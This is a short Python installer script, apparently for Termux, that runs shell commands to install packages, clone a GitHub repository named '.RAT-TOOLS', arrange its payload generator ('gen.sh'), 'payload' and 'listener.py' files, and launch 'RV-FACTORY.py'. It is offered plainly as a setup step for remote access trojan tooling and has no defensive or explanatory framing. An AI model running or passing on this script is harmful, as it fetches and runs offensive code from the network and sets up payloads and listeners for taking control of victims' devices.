import os
os.system ("""
apt update && apt upgrade
pkg update
pkg upgrade
pkg install git
pkg install python
pkg install python2
pkg install pip
pkg install pip2
pkg install nano
pkg install figlet
git clone https://github.com/redvirous7/.RAT-TOOLS
cd .RAT-TOOLS
mkdir modules
mv gen.sh modules
mv payload modules
mv listener.py modules
python RV-FACTORY.py

""")
